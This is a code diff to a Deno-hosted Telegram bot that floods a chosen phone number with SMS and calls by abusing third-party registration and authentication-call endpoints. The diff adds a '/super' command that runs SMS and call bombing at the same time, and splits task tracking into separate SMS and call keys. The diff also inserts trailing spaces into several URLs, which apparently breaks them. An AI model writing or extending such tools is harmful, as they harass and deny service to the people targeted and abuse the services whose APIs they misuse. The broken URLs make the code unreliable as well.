@@ -4,13 +4,13 @@
 // 🧠 Uses Deno KV for persistent state (never stops working)
 // ✨ /stop halts all tasks instantly, even during waits
 
-import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
-import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";
+import { serve } from "https://deno.land/std@0.224.0/http/server.ts    ";
+import { delay } from "https://deno.land/std@0.224.0/async/delay.ts    ";
 
 // --- 🔐 Telegram setup ---
 const TOKEN = Deno.env.get("BOT_TOKEN");
 if (!TOKEN) throw new Error("❌ BOT_TOKEN env var is required");
-const API = `https://api.telegram.org/bot${TOKEN}`;
+const API = `https://api.telegram.org/bot    ${TOKEN}`;
 const SECRET_PATH = "/masakoffvpnhelper";
 
 // --- 👑 Admin usernames (add more as needed) ---
@@ -66,11 +66,11 @@ async function sleepInterruptible(totalMs: number, chatId: string, chunkMs = 500
 
 // --- 💣 SMS sending job ---
 async function runSMS(chatId: string, phoneNumber: string, targetCount: number) {
-  const key = ["task", chatId];
+  const key = ["task", chatId, "sms"]; // Updated key to be specific for SMS task
   await kv.set(key, { type: "sms", phoneNumber, stop: false, count: 0, target: targetCount });
 
   const requestData = {
-    url: "https://api.saray.tm/api/v1/accounts",
+    url: "https://api.saray.tm/api/v1/accounts    ",
     headers: {
       "Accept": "application/json",
       "Content-Type": "application/json; charset=utf-8",
@@ -134,11 +134,11 @@ async function runSMS(chatId: string, phoneNumber: string, targetCount: number) 
 
 // --- 📞 Call sending job ---
 async function runCall(chatId: string, phoneNumber: string) {
-  const key = ["task", chatId];
+  const key = ["task", chatId, "call"]; // Updated key to be specific for Call task
   await kv.set(key, { type: "call", phoneNumber, stop: false });
 
-  const installUrl = "https://api.telz.com/app/install";
-  const callUrl = "https://api.telz.com/app/auth_call";
+  const installUrl = "https://api.telz.com/app/install    ";
+  const callUrl = "https://api.telz.com/app/auth_call    ";
   const headers = {
     "User-Agent": "Telz-Android/17.5.17",
     "Content-Type": "application/json"
@@ -209,6 +209,29 @@ async function runCall(chatId: string, phoneNumber: string) {
   }
 }
 
+// --- 🚀 Super sending job (SMS + Call) ---
+async function runSuper(chatId: string, phoneNumber: string, targetCount: number) {
+  const smsKey = ["task", chatId, "sms"];
+  const callKey = ["task", chatId, "call"];
+
+  // Set up individual tasks
+  await kv.set(smsKey, { type: "sms", phoneNumber, stop: false, count: 0, target: targetCount });
+  await kv.set(callKey, { type: "call", phoneNumber, stop: false });
+
+  await sendMessage(chatId, `🚀 Starting SUPER mode for +993${phoneNumber} 🔥\nThis combines SMS (Target: ${targetCount}) and Call bombing simultaneously.`);
+
+  // Start both tasks concurrently
+  const smsPromise = runSMS(chatId, phoneNumber, targetCount);
+  const callPromise = runCall(chatId, phoneNumber);
+
+  // Wait for both to finish (or be stopped)
+  await Promise.all([smsPromise, callPromise]);
+
+  // Optionally, send a final message when both are done
+  // This might be redundant if individual tasks already report their finish
+  // await sendMessage(chatId, `⏹ SUPER mode for +993${phoneNumber} finished.`);
+}
+
 // --- 🖥️ Webhook Server ---
 serve(async (req) => {
   const url = new URL(req.url);
@@ -232,6 +255,7 @@ serve(async (req) => {
       "📲 Commands:\n" +
       "• /sms <number> <count> — start sending SMS\n" +
       "• /call <number> — start sending calls\n" +
+      "• /super <number> <count> — start SMS AND calls simultaneously\n" +
       "• /stop — stop all sending ⛔\n\n" +
       "✨ Created by @Masakoff"
     );
@@ -251,9 +275,11 @@ serve(async (req) => {
       return new Response("OK");
     }
 
-    const existing = await kv.get(["task", chatId]);
-    if (existing.value && !existing.value.stop) {
-      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
+    // Check for any active task (SMS, Call, or Super)
+    const smsTask = await kv.get(["task", chatId, "sms"]);
+    const callTask = await kv.get(["task", chatId, "call"]);
+    if ((smsTask.value && !smsTask.value.stop) || (callTask.value && !callTask.value.stop)) {
+      await sendMessage(chatId, "⚠️ A task (SMS, Call, or Super) is already running. Stop it first with /stop.");
       return new Response("OK");
     }
 
@@ -276,24 +302,61 @@ serve(async (req) => {
       return new Response("OK");
     }
 
-    const existing = await kv.get(["task", chatId]);
-    if (existing.value && !existing.value.stop) {
-      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
+    // Check for any active task (SMS, Call, or Super)
+    const smsTask = await kv.get(["task", chatId, "sms"]);
+    const callTask = await kv.get(["task", chatId, "call"]);
+    if ((smsTask.value && !smsTask.value.stop) || (callTask.value && !callTask.value.stop)) {
+      await sendMessage(chatId, "⚠️ A task (SMS, Call, or Super) is already running. Stop it first with /stop.");
       return new Response("OK");
     }
 
     runCall(chatId, phoneNumber).catch(console.error);
     await sendMessage(chatId, `📞 Call sending started for +993${phoneNumber}`);
+  } else if (text.startsWith("/super")) { // Added /super command handler
+    const parts = text.split(" ");
+    if (parts.length < 3) {
+      await sendMessage(chatId, "⚠️ Please provide phone number and SMS count. Example: /super 61234567 10");
+      return new Response("OK");
+    }
+
+    const phoneNumber = parts[1].replace(/^\+993/, "");
+    const countStr = parts[2];
+    const targetCount = parseInt(countStr, 10);
+
+    if (isNaN(targetCount) || targetCount <= 0) {
+      await sendMessage(chatId, "⚠️ Please provide a valid positive number for SMS count.");
+      return new Response("OK");
+    }
+
+    // Check for any active task (SMS, Call, or Super)
+    const smsTask = await kv.get(["task", chatId, "sms"]);
+    const callTask = await kv.get(["task", chatId, "call"]);
+    if ((smsTask.value && !smsTask.value.stop) || (callTask.value && !callTask.value.stop)) {
+      await sendMessage(chatId, "⚠️ A task (SMS, Call, or Super) is already running. Stop it first with /stop.");
+      return new Response("OK");
+    }
+
+    runSuper(chatId, phoneNumber, targetCount).catch(console.error);
+    await sendMessage(chatId, `🚀 SUPER mode started for +993${phoneNumber}\nSMS Target: ${targetCount}, Calls: Ongoing`);
   } else if (text.startsWith("/stop")) {
-    const task = await kv.get(["task", chatId]);
-    if (!task.value) {
-      await sendMessage(chatId, "ℹ️ No active task to stop.");
+    const smsTask = await kv.get(["task", chatId, "sms"]);
+    const callTask = await kv.get(["task", chatId, "call"]);
+    const hasActiveTask = (smsTask.value && !smsTask.value.stop) || (callTask.value && !callTask.value.stop);
+
+    if (!hasActiveTask) {
+      await sendMessage(chatId, "ℹ️ No active task (SMS, Call, or Super) to stop.");
     } else {
-      await kv.set(["task", chatId], { ...task.value, stop: true });
-      await sendMessage(chatId, `🛑 Stop signal sent! ${task.value.type === 'call' ? 'Calls' : 'SMS'} will halt instantly.`);
+      // Stop both SMS and Call tasks if they exist
+      if (smsTask.value && !smsTask.value.stop) {
+        await kv.set(["task", chatId, "sms"], { ...smsTask.value, stop: true });
+      }
+      if (callTask.value && !callTask.value.stop) {
+        await kv.set(["task", chatId, "call"], { ...callTask.value, stop: true });
+      }
+      await sendMessage(chatId, `🛑 Stop signal sent! All active tasks (SMS, Call, Super) will halt instantly.`);
     }
   } else {
-    await sendMessage(chatId, "❓ Unknown command. Try /start, /sms <number> <count>, /call <number>, or /stop.");
+    await sendMessage(chatId, "❓ Unknown command. Try /start, /sms <number> <count>, /call <number>, /super <number> <count>, or /stop.");
   }
 
   return new Response("OK");
@@ -302,16 +365,19 @@ serve(async (req) => {
 // --- ♻️ Auto-recover unfinished tasks on startup ---
 (async () => {
   console.log("🔄 Checking for unfinished tasks...");
-  for await (const entry of kv.list<{ type: string; phoneNumber: string; stop: boolean }>({ prefix: ["task"] })) {
+  // Check for SMS tasks
+  for await (const entry of kv.list<{ type: string; phoneNumber: string; stop: boolean }>({ prefix: ["task", "", "sms"] })) {
     if (entry.value && !entry.value.stop) {
       console.log(`Resuming ${entry.value.type} task for chat ${entry.key[1]} -> ${entry.value.phoneNumber}`);
-      if (entry.value.type === "sms") {
-        const targetCount = entry.value.target || 0;
-        runSMS(entry.key[1] as string, entry.value.phoneNumber, targetCount).catch(console.error);
-      } else if (entry.value.type === "call") {
-        runCall(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
-      }
+      const targetCount = entry.value.target || 0;
+      runSMS(entry.key[1] as string, entry.value.phoneNumber, targetCount).catch(console.error);
+    }
+  }
+  // Check for Call tasks
+  for await (const entry of kv.list<{ type: string; phoneNumber: string; stop: boolean }>({ prefix: ["task", "", "call"] })) {
+    if (entry.value && !entry.value.stop) {
+      console.log(`Resuming ${entry.value.type} task for chat ${entry.key[1]} -> ${entry.value.phoneNumber}`);
+      runCall(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
     }
   }
 })();
-
